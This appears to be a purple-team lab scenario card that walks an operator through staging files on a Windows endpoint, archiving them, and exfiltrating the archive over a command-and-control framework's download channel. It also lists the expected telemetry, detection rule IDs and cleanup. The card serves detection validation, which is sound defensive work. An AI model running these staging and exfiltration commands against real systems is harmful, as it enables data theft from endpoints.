# SC-05 — Data staging and exfil

**ATT&CK:** T1074.001 (Local Data Staging), T1005 (Data from Local
System — the audit tag for downloads), T1105 (Ingress Tool Transfer —
the transfer channel itself)

## Objective

Stage a faux document set on the endpoint and pull it to the operator
host via the framework's download path — the full loop: stage →
compress → transfer → verify against audit ground truth.

## Prerequisites

- Interactive shell session; `download` works over both transports
  (beacon chunks ride the next poll — worth demonstrating).

## Procedure (operator console)

```
interact <session-prefix>
shell
```

In the shell:

```
mkdir C:\\labs\staging
copy C:\Windows\*.log C:\\labs\staging\ 2>nul
dir C:\\labs\staging
tar -czf C:\\labs\staged.tar.gz -C C:\\labs staging
certutil -hashfile C:\\labs\staged.tar.gz SHA256
back
```

Then exfil over the framework channel:

```
download C:\\labs\staged.tar.gz /tmp/staged.tar.gz
transfers
```

Console-side verify:

```
shasum -a 256 /tmp/staged.tar.gz
history
```

## Expected host artifacts

- EID 1: `tar.exe` under the agent shell (staging bundle).
- EID 11: staged copies + `staged.tar.gz` create; the certutil hash
  run from SC-04's rule family.
- Server side: transfer spool `data/transfers/<id>/` holds the chunks;
  audit `transfers` row records bytes + SHA (tag `T1005` for the
  download; the transport leg is `T1105`).
- Network: sustained uplink volume from the agent (mTLS), or spread
  across polls (https) — the volume-shape contrast between transports
  is a T1071-playbook takeaway.

## Expected detections

- `13bbd85b-a3c5-4bb2-9afc-be03d28a1e45` (transfer-spool file
  activity).
- `90120763-6b76-4850-aedf-a6a2d57e7d28` (agent-spawns-shell) for the
  staging processes.
- Your SIEM's archive-creation + outbound-volume analytics.

## Cleanup

In the shell: `rmdir /s /q C:\\labs\staging & del C:\\labs\staged.tar.gz`,
operator side `rm /tmp/staged.tar.gz`.

## Coverage-report row

```
SC-05 | staging + exfil | T1074.001,T1005,T1105 | exercised | detections: <what fired>
```
